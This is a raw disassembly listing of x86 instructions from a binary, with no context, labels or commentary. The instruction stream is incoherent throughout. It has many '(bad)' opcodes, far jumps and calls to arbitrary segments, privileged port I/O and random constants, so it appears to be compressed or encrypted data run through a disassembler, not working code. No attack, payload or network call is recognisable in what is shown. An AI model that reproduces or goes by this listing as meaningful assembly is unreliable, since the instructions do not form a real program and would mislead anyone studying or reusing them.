  402f64:	push   0x56
  402f66:	pop    esi
  402f67:	inc    edi
  402f68:	(bad)  
  402f6a:	or     DWORD PTR [edi+0x79],0xffffffb9
  402f6e:	ds jle 0x402fc5
  402f71:	xlat   BYTE PTR ds:[ebx]
  402f72:	mov    dh,0x34
  402f74:	and    esp,DWORD PTR [edi]
  402f76:	ins    BYTE PTR es:[edi],dx
  402f77:	sbb    al,0xd9
  402f79:	push   0x24
  402f7b:	or     eax,0x6c27c825
  402f80:	mov    dh,0xca
  402f82:	cwde   
  402f83:	adc    BYTE PTR [ebx-0x6f],al
  402f86:	fisubr DWORD PTR [ecx]
  402f88:	jns    0x402f47
  402f8a:	xor    al,0x3c
  402f8c:	outs   dx,DWORD PTR ds:[esi]
  402f8d:	and    al,0xe7
  402f8f:	scas   al,BYTE PTR es:[edi]
  402f90:	pop    ds
  402f91:	int3   
  402f92:	fidivr DWORD PTR [eax]
  402f94:	xchg   edx,eax
  402f95:	stos   DWORD PTR es:[edi],eax
  402f96:	in     al,dx
  402f97:	jbe    0x402fd5
  402f99:	cmc    
  402f9a:	aas    
  402f9b:	out    dx,eax
  402f9c:	sub    al,0x4e
  402f9e:	addr16 xchg ebp,eax
  402fa0:	xchg   ebx,eax
  402fa1:	mov    bh,BYTE PTR [esp+edx*1]
  402fa4:	pop    edi
  402fa5:	xor    eax,0xcafb55e
  402faa:	sub    DWORD PTR [ebx-0x7e604c2c],edi
  402fb0:	pop    edi
  402fb1:	or     BYTE PTR [eax+0x51],dl
  402fb4:	neg    cl
  402fb6:	jmp    0x9cf90405
  402fbb:	cmc    
  402fbc:	push   0xffffffe5
  402fbe:	jo     0x403023
  402fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fc1:	int    0x60
  402fc3:	xor    esi,ecx
  402fc5:	out    dx,al
  402fc6:	inc    edi
  402fc7:	(bad)  
  402fc8:	popa   
  402fc9:	dec    edx
  402fca:	data16 in al,dx
  402fcc:	jbe    0x402fa9
  402fce:	sub    cl,BYTE PTR [eax-0x7d]
  402fd1:	dec    eax
  402fd2:	dec    edx
  402fd3:	(bad)  
  402fd5:	sbb    al,0x60
  402fd7:	xchg   ebx,eax
  402fd8:	lods   eax,DWORD PTR ds:[esi]
  402fd9:	out    0x78,eax
  402fdb:	ins    BYTE PTR es:[edi],dx
  402fdc:	ja     0x402faa
  402fde:	xchg   edi,eax
  402fdf:	ss xchg ecx,eax
  402fe1:	xchg   edi,eax
  402fe2:	mov    edx,0xc3c67c16
  402fe7:	jl     0x403034
  402fe9:	adc    ebp,ecx
  402feb:	mov    cs,ebp
  402fed:	mov    dh,0x75
  402fef:	ins    BYTE PTR es:[edi],dx
  402ff0:	pop    ss
  402ff1:	stc    
  402ff2:	call   0xe0e1:0x39f63b12
  402ff9:	ret    0xfa3c
  402ffc:	in     al,dx
  402ffd:	dec    ebx
  402ffe:	outs   dx,BYTE PTR ds:[esi]
  402fff:	push   cs
  403000:	das    
  403001:	cli    
  403002:	lock daa 
  403004:	sub    ecx,DWORD PTR [ebx]
  403006:	adc    ebx,ebx
  403008:	les    edi,FWORD PTR [eax+0x7b]
  40300b:	sbb    ch,cl
  40300d:	inc    esp
  40300e:	or     eax,0x4ebeb2a3
  403013:	jg     0x403005
  403015:	inc    esi
  403016:	lds    esi,FWORD PTR [edi+0x7958af13]
  40301c:	and    DWORD PTR [esi-0x5f3c0ad0],edx
  403022:	cmc    
  403023:	inc    ebp
  403024:	rcl    esi,0x1f
  403027:	sti    
  403028:	clc    
  403029:	std    
  40302a:	bound  edx,QWORD PTR [ebp+0x6e5efaa3]
  403030:	pusha  
  403031:	xor    eax,0x4cb39b8d
  403036:	lods   al,BYTE PTR ds:[esi]
  403037:	or     ebx,edi
  403039:	push   0x3b4e8b2a
  40303e:	xchg   ebx,eax
  40303f:	ds add eax,0xcac9e831
  403045:	mov    dl,0xdb
  403047:	or     BYTE PTR ds:0x3b33c93,dh
  40304d:	dec    edi
  40304e:	push   esp
  40304f:	mov    ecx,0xd0a858f6
  403054:	(bad)  
  403055:	jnp    0x403042
  403057:	xor    eax,0x326b805b
  40305c:	mov    edx,0xa90755d5
  403061:	add    BYTE PTR [eax+0x66],cl
  403064:	ror    DWORD PTR [edx-0x3054e4f5],cl
  40306a:	mov    WORD PTR [ecx+ecx*8],fs
  40306d:	cld    
  40306e:	mov    bl,0x74
  403070:	fmul   st(3),st
  403072:	scas   eax,DWORD PTR es:[edi]
  403073:	mov    ch,0xf8
  403075:	repnz xchg ecx,eax
  403077:	pop    es
  403078:	bound  ecx,QWORD PTR [ecx+eax*1]
  40307b:	scas   al,BYTE PTR es:[edi]
  40307c:	xchg   DWORD PTR [eax+ecx*1-0x3186e2e3],edx
  403083:	mov    ?,WORD PTR [ebx-0xf]
  403086:	pop    ds
  403087:	test   DWORD PTR [esi],0xda05c6cd
  40308d:	sti    
  40308e:	inc    ebp
  40308f:	stc    
  403090:	icebp  
  403091:	inc    edx
  403092:	push   ss
  403093:	vrsqrtps ymm1,ymm6
  403097:	cmp    eax,0x978ba36e
  40309c:	test   eax,0x59f368d1
  4030a1:	iret   
  4030a2:	mov    al,ds:0xf387e468
  4030a7:	fs and esp,edx
  4030aa:	test   BYTE PTR [eax+0x2e],bh
  4030ad:	les    ebx,FWORD PTR [edx-0x61]
  4030b0:	and    al,0xd4
  4030b2:	pop    es
  4030b3:	mov    esi,0x2d00a577
  4030b8:	data16 xor BYTE PTR [edi],bl
  4030bb:	rcl    WORD PTR [edx-0x50],0x70
  4030c0:	sub    ebp,DWORD PTR [eax]
  4030c2:	fs test al,0xea
  4030c5:	inc    eax
  4030c6:	ret    0xbe3c
  4030c9:	(bad)  
  4030ca:	sub    eax,0xb6b104a6
  4030cf:	test   DWORD PTR [ebp+0x5c],ecx
  4030d2:	add    edi,ecx
  4030d4:	or     DWORD PTR [edx+0x37],ecx
  4030d7:	dec    edx
  4030d8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4030da:	cmp    al,0x1c
  4030dc:	mov    bl,BYTE PTR [edx]
  4030de:	adc    DWORD PTR [ebp+0x7204e25b],esi
  4030e4:	xchg   ebp,eax
  4030e5:	push   ecx
  4030e6:	mov    bh,0x2c
  4030e8:	mov    cl,0x2a
  4030ea:	adc    DWORD PTR [ebx],eax
  4030ec:	mov    al,ds:0x5d15587e
  4030f1:	sub    edx,DWORD PTR [edx+0x6e85e3df]
  4030f7:	ret    0x4cb2
  4030fa:	xor    BYTE PTR [ebp+0x51],dh
  4030fd:	(bad)  
  4030ff:	int3   
  403100:	dec    edi
  403101:	test   eax,0xbc679a20
  403106:	and    cl,BYTE PTR [edi+0x11]
  403109:	out    dx,al
  40310a:	pushf  
  40310b:	adc    eax,0xf00a8231
  403110:	jnp    0x4030e0
  403112:	xor    dh,al
  403114:	fs repnz push ebx
  403117:	jmp    0xe099:0xd33aa3ed
  40311e:	(bad)  
  40311f:	lock push ss
  403121:	jl     0x40318c
  403123:	add    eax,0xc382c19
  403128:	(bad)  
  403129:	loop   0x4030c0
  40312b:	frstor [ebx]
  40312d:	mov    eax,ds:0x8573aa1
  403132:	push   ebp
  403133:	pop    ss
  403134:	out    0xb5,al
  403136:	cmp    bh,ah
  403138:	push   esi
  403139:	inc    edi
  40313a:	xor    DWORD PTR [ebx],ebx
  40313c:	xchg   esp,eax
  40313d:	xor    BYTE PTR [ebp+0x3482ee28],ah
  403143:	xchg   BYTE PTR [ebx+0x32],ch
  403146:	xchg   BYTE PTR [edx-0x64],al
  403149:	lahf   
  40314a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40314b:	lods   al,BYTE PTR ds:[esi]
  40314c:	test   BYTE PTR [ecx+0x14],0x1f
  403150:	(bad)  
  403151:	mov    ecx,0x750b34c0
  403156:	sbb    eax,0xeffd9714
  40315b:	inc    eax
  40315c:	dec    esp
  40315d:	push   edi
  40315e:	jae    0x40319c
  403160:	push   ebp
  403162:	mov    esp,0x2f60b14d
  403167:	out    0x49,al
  403169:	sbb    edx,ebp
  40316b:	in     eax,dx
  40316c:	mov    esp,0x5b179427
  403171:	xor    dl,BYTE PTR [ecx]
  403173:	push   ds
  403174:	and    al,0xf3
  403176:	bound  edi,QWORD PTR [edx]
  403178:	aad    0xf0
  40317a:	call   0xb5ce0293
  40317f:	dec    eax
  403180:	repnz xor DWORD PTR [edi+0x4b5f80d8],esp
  403187:	xlat   BYTE PTR ds:[ebx]
  403188:	jecxz  0x4031f7
  40318a:	push   eax
  40318b:	scas   al,BYTE PTR es:[edi]
  40318c:	sub    BYTE PTR [esi],dl
  40318e:	retf   0xb46b
  403191:	test   DWORD PTR [esi+0x74],eax
  403194:	cmp    dh,BYTE PTR [edx+0x72]
  403197:	shl    eax,cl
  403199:	sub    al,0xf3
  40319b:	out    dx,eax
  40319c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40319d:	push   ss
  40319e:	daa    
  40319f:	lods   al,BYTE PTR ds:[esi]
  4031a0:	push   ecx
  4031a1:	arpl   WORD PTR [edx+0x7b3d9290],bx
  4031a7:	cs mov eax,0x4e8f0da5
  4031ad:	mov    ebx,0xde31a5ff
  4031b2:	dec    eax
  4031b3:	jl     0x40316a
  4031b5:	sar    bh,1
  4031b7:	iret   
  4031b8:	rep stos DWORD PTR es:[edi],eax
  4031ba:	aad    0x3f
  4031bc:	nop
  4031bd:	push   0x54bdb9ba
  4031c2:	cmp    al,0xbf
  4031c4:	xchg   edi,eax
  4031c5:	(bad)  
  4031c6:	jmp    FWORD PTR [eax-0x697929c3]
  4031cc:	mov    cl,0xb2
  4031ce:	mov    edx,0x26fc9c63
  4031d3:	jb     0x403175
  4031d5:	aaa    
  4031d6:	fiadd  DWORD PTR [ecx+0x362d58d9]
  4031dc:	jle    0x4031dc
  4031de:	out    dx,eax
  4031df:	stos   BYTE PTR es:[edi],al
  4031e0:	inc    ebp
  4031e1:	mov    edx,0xfb9c0331
  4031e6:	cmp    ah,cl
  4031e8:	xchg   ecx,eax
  4031e9:	sub    ebx,DWORD PTR [esi]
  4031eb:	xchg   esp,eax
  4031ec:	jmp    0x23c6:0xfd025491
  4031f3:	mov    bl,0x92
  4031f5:	sti    
  4031f6:	das    
  4031f7:	outs   dx,DWORD PTR ds:[esi]
  4031f8:	(bad)  [ebp-0x2e]
  4031fb:	inc    esp
  4031fc:	loopne 0x4031ce
  4031fe:	push   esi
  4031ff:	neg    DWORD PTR [ebx-0x2cb16056]
  403205:	dec    edx
  403206:	(bad)  
  403207:	push   edx
  403208:	push   0xeb5d7333
  40320d:	int    0x8c
  40320f:	mov    bl,0x7e
  403211:	stc    
  403212:	and    DWORD PTR [ecx],ebx
  403214:	(bad)  
  403216:	dec    ecx
  403217:	adc    ebx,ebx
  403219:	sahf   
  40321a:	shl    edi,1
  40321c:	leave  
  40321d:	stos   BYTE PTR es:[edi],al
  40321e:	and    al,0x62
  403220:	lahf   
  403221:	pop    ds
  403222:	not    DWORD PTR [edi+edx*1]
  403225:	or     DWORD PTR [esi-0x2fc91018],ecx
  40322b:	and    esp,DWORD PTR [edx-0x13]
  40322e:	dec    esp
  40322f:	add    esi,DWORD PTR [edx+0x4e]
  403232:	or     eax,0x562b71fa
  403237:	pop    ebx
  403238:	or     DWORD PTR [ebp-0x38e0251b],esi
  40323e:	mov    al,0xc9
  403240:	outs   dx,BYTE PTR ds:[esi]
  403241:	inc    ecx
  403242:	(bad)  
  403243:	(bad)  
  403244:	fcom   QWORD PTR [ecx+0x2f]
  403247:	lds    edi,FWORD PTR [edi+esi*8+0x7]
  40324b:	rcl    bl,cl
  40324d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40324e:	jne    0x403290
  403250:	retf   
  403251:	scas   al,BYTE PTR es:[edi]
  403252:	jo     0x4032b3
  403254:	xchg   eax,esi
  403256:	es clc 
  403258:	dec    ebp
  403259:	jb     0x403295
  40325b:	pusha  
  40325c:	iret   
  40325d:	sbb    ebx,ecx
  40325f:	fisub  WORD PTR [ebx-0x62]
  403262:	cmp    BYTE PTR [ebp-0x67],dl
  403265:	sub    al,0xba
  403267:	imul   esi,DWORD PTR [ebx+0x46],0x13
  40326b:	je     0x62043106
  403271:	loopne 0x403241
  403273:	sbb    al,0xeb
  403275:	dec    esp
  403276:	push   eax
  403277:	mov    eax,DWORD PTR [ecx+0x6c57cf9f]
  40327d:	es xchg edx,eax
  40327f:	setno  ah
  403282:	ds add cl,bh
  403285:	aas    
  403286:	fcom   DWORD PTR [edx+0x7b861e60]
  40328c:	xlat   BYTE PTR ds:[ebx]
  40328d:	outs   dx,BYTE PTR ds:[esi]
  40328e:	aas    
  40328f:	ficom  WORD PTR [edx]
  403291:	lock xchg ebp,eax
  403293:	(bad)  
  403294:	(bad)  
  403296:	push   esi
  403297:	jle    0x4032b7
  403299:	pop    ebx
  40329a:	iret   
  40329b:	inc    esi
  40329c:	out    0x54,eax
  40329e:	mul    dh
  4032a0:	sbb    BYTE PTR [esp+ecx*2],bl
  4032a3:	or     al,0xf9
  4032a5:	push   ecx
  4032a6:	aad    0x7c
  4032a8:	test   eax,0x25b11e89
  4032ad:	shl    ah,0x21
  4032b0:	fild   WORD PTR [esi+0x66]
  4032b3:	inc    esp
  4032b4:	xchg   ebx,eax
  4032b5:	inc    ecx
  4032b6:	mov    ebx,edi
  4032b8:	xor    dl,BYTE PTR [edx-0x6d]
  4032bb:	pop    esp
  4032bc:	or     ah,BYTE PTR [eax]
  4032be:	dec    esp
  4032bf:	dec    ebx
  4032c0:	inc    esi
  4032c1:	inc    ebp
  4032c2:	push   eax
  4032c3:	mov    ecx,DWORD PTR [ebx-0x3b]
  4032c6:	mov    ebx,0x638f75d8
  4032cb:	xchg   ebp,eax
  4032cc:	ret    
  4032cd:	jecxz  0x403308
  4032cf:	jg     0x40331d
  4032d1:	or     al,BYTE PTR [ebp-0xd575869]
  4032d7:	inc    edi
  4032d8:	es and al,0xde
  4032db:	out    dx,eax
  4032dc:	cmp    eax,0x9c13a55b
  4032e1:	into   
  4032e2:	sar    DWORD PTR [ebx-0x40274047],0x5d
  4032e9:	popa   
  4032ea:	jmp    0xcf7f:0x64fe2eb
  4032f1:	push   ebx
  4032f2:	fsubr  DWORD PTR [ebx+0x49c71f82]
  4032f8:	dec    edi
  4032f9:	hlt    
  4032fa:	fidivr WORD PTR [ecx+0x46511604]
  403300:	sbb    al,0xc0
  403302:	int3   
  403303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403304:	push   esp
  403305:	sub    al,bl
  403307:	ficomp DWORD PTR [ecx+0x3f618d82]
  40330d:	lds    esi,FWORD PTR [eax]
  40330f:	push   edx
  403310:	mov    esi,0xfeea4a36
  403315:	push   es
  403316:	sub    eax,0x401a1da
  40331b:	xchg   edx,eax
  40331c:	pop    ss
  40331d:	pusha  
  40331e:	dec    eax
  40331f:	ds add al,al
  403322:	pop    ebp
  403323:	loopne 0x4032a7
  403325:	pop    ds
  403326:	adc    edi,DWORD PTR [edx]
  403328:	jne    0x4032dc
  40332a:	shl    BYTE PTR [ecx+0x1091c1cb],0xc9
  403331:	loop   0x403391
  403333:	jns    0x403311
  403335:	xor    ah,al
  403337:	enter  0x7e91,0xfa
  40333b:	shl    DWORD PTR [esi],cl
  40333d:	aad    0xc4
  40333f:	adc    DWORD PTR [eax],eax
  403341:	mov    ecx,0x4e6965e9
  403346:	popf   
  403347:	pop    eax
  403348:	test   ah,0xc0
  40334b:	or     DWORD PTR [esi],ebp
  40334d:	out    0x27,eax
  40334f:	out    0x6b,eax
  403351:	popa   
  403352:	inc    ecx
  403353:	push   ebp
  403354:	sbb    BYTE PTR ds:0x80687a2e,bh
  40335a:	pushf  
  40335b:	inc    edx
  40335c:	retf   0x36e0
  40335f:	call   0x97a9:0x60c24e29
  403366:	mov    ds:0xe3b784bc,al
  40336b:	dec    esi
  40336c:	call   0x5f61735a
  403371:	lods   al,BYTE PTR ds:[esi]
  403372:	push   esi
  403373:	jae    0x4033ed
  403375:	mov    ebx,DWORD PTR [eax+eiz*8+0x65d19d5a]
  40337c:	das    
  40337d:	jne    0x40338b
  40337f:	fs fsubrp st(0),st
  403382:	xor    al,0x46
  403384:	bound  esp,QWORD PTR [edx+0x18]
  403387:	pop    ecx
  403388:	mov    dh,0xd4
  40338a:	cmp    ch,BYTE PTR ds:0x7eb7a1b1
  403390:	jb     0x40334a
  403392:	imul   edi,DWORD PTR [edx+0x46],0xc34b5c2d
  403399:	pop    edi
  40339a:	js     0x40336a
  40339c:	push   esi
  40339d:	push   es
  40339e:	push   cs
  40339f:	lock nop
  4033a1:	test   eax,0x4c555ca8
  4033a6:	mov    dh,0xb9
  4033a8:	(bad)  
  4033a9:	imul   edx,DWORD PTR [eax+edx*2],0xccff2c27
  4033b0:	test   DWORD PTR [esi],0xccb5395e
  4033b6:	sbb    al,0xd8
  4033b8:	dec    esp
  4033b9:	les    eax,FWORD PTR [ebx+0x34]
  4033bc:	jmp    DWORD PTR [edx-0x164a2323]
  4033c2:	call   0xff01:0x72f07ab3
  4033c9:	pop    esi
  4033ca:	sub    DWORD PTR [ebx+0x59494e05],esi
  4033d0:	enter  0x19d8,0xc0
  4033d4:	add    al,0xc3
  4033d6:	mov    dl,dl
  4033d8:	inc    ebx
  4033d9:	mov    WORD PTR [eax+0x5034799e],fs
  4033df:	lahf   
  4033e0:	xchg   ebx,eax
  4033e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033e2:	cmc    
  4033e3:	mov    ebp,0xdfb2dea1
  4033e8:	jp     0x4033d2
  4033ea:	(bad)  
  4033eb:	push   edi
  4033ec:	call   0x55147456
  4033f1:	stos   DWORD PTR es:[edi],eax
  4033f2:	mov    ebx,0x8cf7660c
  4033f7:	in     eax,dx
  4033f8:	push   0x5d9ba8b7
  4033fd:	cmc    
  4033fe:	test   DWORD PTR [ebp+0x74476a41],esi
  403404:	mov    ch,0xa6
  403406:	adc    DWORD PTR [ebp-0x3e],edx
  403409:	aaa    
  40340a:	jl     0x4033c9
  40340c:	cld    
  40340d:	push   edi
  40340f:	jno    0x403432
  403411:	out    dx,al
  403412:	loopne 0x4033bb
  403414:	sub    al,0x95
  403416:	clc    
  403417:	stos   DWORD PTR es:[edi],eax
  403418:	sbb    al,0xac
  40341a:	and    eax,0x4debbcca
  40341f:	adc    DWORD PTR [edi-0x1a],0x9b5365ff
  403426:	ja     0x4033c9
  403428:	adc    DWORD PTR [edi-0x42ef0e87],edi
  40342e:	mov    ds:0xf006bba5,eax
  403433:	dec    edi
  403434:	sub    BYTE PTR [ebx],ah
  403436:	pop    ss
  403437:	sbb    al,0x8a
  403439:	inc    ecx
  40343a:	dec    esp
  40343b:	push   ebx
  40343c:	fmul   st,st(0)
  40343e:	jmp    0x375c2115
  403443:	inc    eax
  403444:	push   ecx
  403445:	push   edi
  403446:	(bad)  
  403447:	mov    ebp,0x12d83997
  40344c:	cmp    eax,0xd978d56f
  403451:	mov    bl,0xc5
  403453:	jg     0x403470
  403455:	les    esp,FWORD PTR [edi]
  403457:	xor    BYTE PTR [ebp+0x1de70d18],al
  40345d:	iret   
  40345e:	push   eax
  40345f:	xor    ebp,DWORD PTR [eax+0x50dbd146]
  403465:	jmp    0x92526aa1
  40346a:	je     0x40347b
  40346c:	mov    al,ds:0x16b46f88
  403471:	sbb    al,0x61
  403473:	ja     0x403411
  403475:	jbe    0x40348c
  403477:	cmp    esp,edx
  403479:	int    0xa3
  40347b:	(bad)  
  40347c:	leave  
  40347d:	cmp    al,0xf7
  40347f:	dec    edi
  403480:	das    
  403481:	jb     0x4034c4
  403483:	mov    cl,al
  403485:	invd   
  403487:	mov    ah,0x38
  403489:	and    dl,bh
  40348b:	and    eax,0x51b20759
  403490:	and    BYTE PTR [edi-0x74],ah
  403493:	fidivr WORD PTR [ecx]
  403495:	mov    ecx,ebp
  403497:	xor    eax,0x877de2fa
  40349c:	push   edi
  40349d:	jmp    0x9455:0xb564b736
  4034a4:	push   esp
  4034a5:	das    
  4034a6:	data16 or BYTE PTR [ebx-0x15],bh
  4034aa:	or     ch,BYTE PTR [eax]
  4034ac:	ins    BYTE PTR es:[edi],dx
  4034ad:	xor    BYTE PTR [ebp+0x15],dl
  4034b0:	cmp    edx,DWORD PTR [eax+esi*4-0x435a015c]
  4034b7:	jmp    0x403509
  4034b9:	inc    esi
  4034ba:	dec    eax
  4034bb:	dec    edi
  4034bc:	adc    bh,cl
  4034be:	loopne 0x40350a
  4034c0:	xchg   edi,eax
  4034c1:	cmp    eax,0xb3ee9327
  4034c6:	inc    edx
  4034c7:	or     ecx,0x61aa7918
  4034cd:	retf   0x8fd6
  4034d0:	stc    
  4034d1:	xchg   ecx,eax
  4034d2:	outs   dx,DWORD PTR ds:[esi]
  4034d3:	pop    es
  4034d4:	test   DWORD PTR [ebp+ecx*1+0x53f879a2],ecx
  4034db:	inc    esi
  4034dc:	scas   al,BYTE PTR es:[edi]
  4034dd:	nop
  4034de:	out    0xcb,eax
  4034e0:	jbe    0x4034c8
  4034e2:	pop    esp
  4034e3:	jecxz  0x403499
  4034e5:	and    eax,0xe90c05f1
  4034ea:	dec    esp
  4034eb:	inc    dh
  4034ed:	mov    edi,DWORD PTR [ecx-0x53c32971]
  4034f3:	lods   al,BYTE PTR ds:[esi]
  4034f4:	push   ebx
  4034f5:	aad    0x72
  4034f7:	ret    0xc38b
  4034fa:	add    edx,DWORD PTR [edi]
  4034fc:	sub    esi,DWORD PTR [esi+0x71790e0d]
  403502:	mov    edi,0x91c1c2d1
  403507:	push   0x3c276818
  40350c:	cld    
  40350d:	not    DWORD PTR [edi-0x6a4346c9]
  403513:	cmc    
  403514:	xchg   ebp,eax
  403515:	data16 mov dl,0x78
  403518:	dec    edx
  403519:	mov    ss,WORD PTR [edi]
  40351b:	jbe    0x4034db
  40351d:	test   BYTE PTR [ebx-0x1810827],dh
  403523:	aad    0xd6
  403525:	add    DWORD PTR [esi],esi
  403527:	xor    DWORD PTR [esi*8-0x35795c51],ebx
  40352e:	jmp    0xee42:0xbcf38bcf
  403535:	out    dx,al
  403536:	or     BYTE PTR [ecx-0x30078294],dl
  40353c:	in     al,dx
  40353d:	sub    al,0x6
  40353f:	cmp    DWORD PTR [ecx-0x6c18355d],0x20
  403546:	push   esp
  403547:	xor    ah,BYTE PTR [ebp+ecx*2-0x47b63cf8]
  40354e:	mov    ch,0x9c
  403550:	pop    ds
  403551:	adc    BYTE PTR [ebx+0x2e],0x64
  403555:	xchg   esi,eax
  403556:	test   eax,0x92a927b2
  40355b:	loop   0x4035c3
  40355d:	sbb    BYTE PTR [edx+0x6a5d2171],cl
  403563:	loope  0x403550
  403565:	out    dx,al
  403566:	sbb    bl,BYTE PTR [edx+ecx*8-0x2f8cac99]
  40356d:	lods   eax,DWORD PTR ds:[esi]
  40356e:	aaa    
  40356f:	das    
  403570:	adc    al,BYTE PTR [ebx+0x59]
  403573:	mov    edx,ds
  403575:	shl    BYTE PTR [edx+0x788adc07],1
  40357b:	ret    
  40357c:	outs   dx,BYTE PTR ds:[esi]
  40357d:	xor    eax,0xac81aa43
  403582:	aad    0xc
  403584:	mov    ecx,0x44b49af4
  403589:	rcl    DWORD PTR [edx-0x7d2d343a],cl
  40358f:	and    eax,0x78392318
  403594:	jp     0x403575
  403596:	push   esp
  403597:	out    0x79,al
  403599:	mov    esp,0x24b07e7d
  40359e:	inc    edx
  40359f:	push   ecx
  4035a0:	or     dl,BYTE PTR [ecx]
  4035a2:	imul   esp,DWORD PTR [edi],0x2d
  4035a5:	xchg   BYTE PTR [edx+0x4a],bh
  4035a8:	push   ss
  4035a9:	push   ds
  4035aa:	cwde   
  4035ab:	loopne 0x4035b4
  4035ad:	xor    al,0xc2
  4035af:	test   DWORD PTR [ebx],edx
  4035b1:	add    DWORD PTR [esi-0x33f6d7bd],0x45
  4035b8:	adc    eax,0xd331752e
  4035bd:	stos   BYTE PTR es:[edi],al
  4035be:	inc    ecx
  4035bf:	je     0x40356f
  4035c1:	js     0x403622
  4035c3:	dec    ecx
  4035c4:	xor    BYTE PTR [edx-0xb],0x87
  4035c8:	sbb    edi,DWORD PTR [esi]
  4035ca:	test   bl,ch
  4035cc:	sar    DWORD PTR [eax],1
  4035ce:	cld    
  4035cf:	pop    ds
  4035d0:	arpl   WORD PTR [ebp+0x2b70c852],di
  4035d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035d7:	inc    ebp
  4035d8:	test   eax,0xd2c36029
  4035dd:	xchg   ebp,eax
  4035de:	push   0xcd73eccc
  4035e3:	imul   DWORD PTR [ecx-0x4]
  4035e6:	add    cl,bl
  4035e8:	stos   DWORD PTR es:[edi],eax
  4035e9:	daa    
  4035ea:	inc    esi
  4035eb:	jle    0x40360f
  4035ed:	ins    DWORD PTR es:[edi],dx
  4035ee:	mov    esp,0x489b6cdb
  4035f3:	bound  ebx,QWORD PTR [ecx]
  4035f5:	das    
  4035f6:	hlt    
  4035f7:	aas    
  4035f8:	and    esp,ecx
  4035fa:	cld    
  4035fb:	cld    
  4035fc:	jmp    0x8fb75a18
  403601:	sbb    ebx,DWORD PTR [edx+0x461b6b4d]
  403607:	xor    al,0x1c
  403609:	(bad)  
  40360b:	stos   BYTE PTR es:[edi],al
  40360c:	sti    
  40360d:	mov    bh,0x87
  40360f:	dec    eax
  403610:	fld    DWORD PTR [eax-0x7f]
  403613:	cs stos BYTE PTR es:[edi],al
  403615:	(bad)  [ebp+0x7192dd41]
  40361b:	mov    eax,ds:0x77a0e86e
  403620:	xlat   BYTE PTR ds:[ebx]
  403621:	repnz cmp dh,ch
  403624:	cdq    
  403625:	cmp    ebx,DWORD PTR [edi+eiz*2]
  403628:	mov    ebp,0x6fca0774
  40362d:	dec    esp
  40362e:	dec    esp
  40362f:	inc    esp
  403630:	dec    edi
  403631:	fsubr  QWORD PTR [esi+eiz*1]
  403634:	add    al,0xf4
  403636:	inc    ebp
  403637:	call   0x2ac16f21
  40363c:	push   0x5d
  40363e:	fs inc esi
  403640:	fnstcw WORD PTR [ebx+0x4efcb36a]
  403646:	dec    esp
  403647:	xchg   edx,eax
  403648:	aam    0xb3
  40364a:	leave  
  40364b:	inc    ebp
  40364c:	rol    BYTE PTR [edi],1
  40364e:	lea    edx,[eax+0x31]
  403651:	stos   DWORD PTR es:[edi],eax
  403652:	mov    DWORD PTR ds:0x7c4c0485,ebp
  403658:	les    ecx,FWORD PTR [bx]
  40365b:	and    BYTE PTR [esi+esi*8-0xd595740],0xdb
  403663:	xor    al,0x7b
  403665:	jno    0x40367d
  403667:	xchg   DWORD PTR [eax],edi
  403669:	frstor [ebx+0x21]
  40366c:	outs   dx,DWORD PTR ds:[esi]
  40366d:	and    eax,0x61d384b9
  403672:	pop    ss
  403673:	imul   ebp,DWORD PTR [ecx],0xffffffc9
  403676:	cmc    
  403677:	data16 adc al,0x57
  40367a:	fs scas eax,DWORD PTR es:[edi]
  40367c:	xor    al,0x3f
  40367e:	repz sub al,0x7d
  403681:	inc    esi
  403682:	push   ds
  403683:	stos   DWORD PTR es:[edi],eax
  403684:	cmp    BYTE PTR [esi+0x7c4b5a2],dl
  40368a:	pushf  
  40368b:	adc    dl,BYTE PTR [ebp-0x54]
  40368e:	rol    DWORD PTR [esi],cl
  403690:	add    ah,ah
  403692:	(bad)  
  403693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403694:	cmp    esi,DWORD PTR ds:0x5b37f04f
  40369a:	cmp    BYTE PTR [edi+0x52],bh
  40369d:	fisub  DWORD PTR [edx]
  40369f:	dec    ah
  4036a1:	lods   al,BYTE PTR ds:[esi]
  4036a2:	cmp    DWORD PTR [esi],ecx
  4036a4:	and    al,0x41
  4036a6:	fstp   DWORD PTR [esi]
  4036a8:	push   edx
  4036a9:	sti    
  4036aa:	cmp    eax,0x488ccdcc
  4036af:	push   0x21
  4036b1:	int3   
  4036b2:	inc    ecx
  4036b3:	mov    ebp,0x797fbdb
  4036b8:	pop    ss
  4036b9:	out    dx,eax
  4036ba:	mov    ah,0xd
  4036bc:	cld    
  4036bd:	mov    ebp,0xcce0bd2
  4036c2:	dec    ecx
  4036c3:	(bad)  
  4036c4:	fnstcw WORD PTR [esi+0x1d8f744c]
  4036ca:	xchg   BYTE PTR [edi],cl
  4036cc:	int    0xa2
  4036ce:	push   esi
  4036cf:	and    DWORD PTR [edx],0x36
  4036d2:	inc    ebp
  4036d3:	mov    fs,WORD PTR [eax-0x406049c7]
  4036d9:	aad    0x86
  4036db:	out    dx,eax
  4036dc:	retf   
  4036dd:	js     0x403727
  4036df:	cs push esi
  4036e1:	rol    ah,1
  4036e3:	test   BYTE PTR [edx],dh
  4036e5:	inc    ebp
  4036e6:	and    BYTE PTR [edi-0x62],bh
  4036e9:	cld    
  4036ea:	or     eax,0x76af3bc7
  4036ef:	jbe    0x4036d3
  4036f1:	xor    DWORD PTR [edx+0x2da1ef5f],eax
  4036f7:	and    al,0xde
  4036f9:	cmp    ecx,DWORD PTR [edx+0x14f9b658]
  4036ff:	scas   al,BYTE PTR es:[edi]
  403700:	aam    0x65
  403702:	std    
  403703:	fnstenv [ecx-0x45aa11fa]
  403709:	sub    ah,dl
  40370b:	imul   eax,ebx,0xaa5203d3
  403711:	jb     0x4036ab
  403713:	push   ss
  403714:	cmc    
  403715:	mov    eax,ds:0xd9e6472f
  40371a:	test   BYTE PTR [ecx],dl
  40371c:	push   eax
  40371d:	inc    ecx
  40371e:	xor    al,0xd4
  403720:	mov    bl,0x85
  403722:	pop    esp
  403723:	xchg   esp,esp
  403725:	scas   al,BYTE PTR es:[edi]
  403726:	jg     0x403786
  403728:	fmul   st,st(6)
